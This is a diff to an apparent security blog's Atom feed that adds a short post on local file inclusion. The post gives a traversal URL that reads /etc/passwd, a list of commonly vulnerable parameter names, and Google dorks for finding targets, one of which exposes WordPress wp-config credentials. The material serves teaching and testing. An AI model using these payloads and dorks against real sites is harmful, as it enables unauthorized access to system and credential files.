@@ -4,13 +4,103 @@
  <title>bt0</title>
  <link href="https://www.humbertojunior.com.br/atom.xml" rel="self"/>
  <link href="https://www.humbertojunior.com.br/"/>
- <updated>2021-01-22T22:19:19-03:00</updated>
+ <updated>2021-02-16T12:06:23-03:00</updated>
  <id>https://www.humbertojunior.com.br</id>
  <author>
    <name>bt0</name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>LFI Parameters List</title>
+   <link href="https://www.humbertojunior.com.br/infosec/2021/02/16/lfi-parameters.html"/>
+   <updated>2021-02-16T00:00:00-03:00</updated>
+   <id>https://www.humbertojunior.com.br/infosec/2021/02/16/lfi-parameters</id>
+   <content type="html">&lt;h2 id=&quot;lfi-local-file-inclusion&quot;&gt;LFI (Local File Inclusion)&lt;/h2&gt;
+
+&lt;p&gt;Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. [1]
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;script async=&quot;&quot; src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;&lt;ins class=&quot;adsbygoogle&quot; style=&quot;display:block; text-align:center;&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-5149953309426611&quot; data-ad-slot=&quot;3196203233&quot;&gt;&lt;/ins&gt;
+&lt;script&gt;
+     (adsbygoogle = window.adsbygoogle || []).push({});
+&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Example of test:&lt;/p&gt;
+
+&lt;p&gt;Consider the URL&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; http://vulnerable_host/preview.php?file=example.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The parameter file= could be exploited to point it to another file within the server&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; http://vulnerable_host/preview.php?file=../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The expected result is shown below:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root:x:0:0:root:/root:/bin/bash
+ bin:x:1:1:bin:/bin:/sbin/nologin
+ daemon:x:2:2:daemon:/sbin:/sbin/nologin
+ alex:x:500:500:alex:/home/alex:/bin/bash
+ margo:x:501:501::/home/margo:/bin/bash
+ ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There is a list of most common parameters to test for LFI&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ?cat=
+ ?dir=
+ ?action=
+ ?board=
+ ?date=
+ ?detail=
+ ?file=
+ ?download=
+ ?path=
+ ?folder=
+ ?prefix=
+ ?include=
+ ?page=
+ ?inc=
+ ?locate=
+ ?show=
+ ?doc=
+ ?site=
+ ?type=
+ ?view=
+ ?content=
+ ?document=
+ ?layout=
+ ?mod=
+ ?conf=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can use Google Hacking and dorks to find vulnerable targets like:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; inurl:&quot;wp-license.php?file=../..//wp-config&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;File contain password and directory traversal vulnerability [2]&lt;/p&gt;
+
+&lt;p&gt;Using the same strategy to exploit wordpress and retrieve the wp-config, you could use all those parameters above and create your own Google Hacking Dork to analyze your target.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; inurl:&quot;?cat=&quot; site:&quot;example.com&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;References:&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&quot;&gt;OWASP TOP 10 - LFI&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2] &lt;a href=&quot;https://www.exploit-db.com/ghdb/4940&quot;&gt;GHDB&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for following!&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Installing GVM on Kali Linux 2020</title>
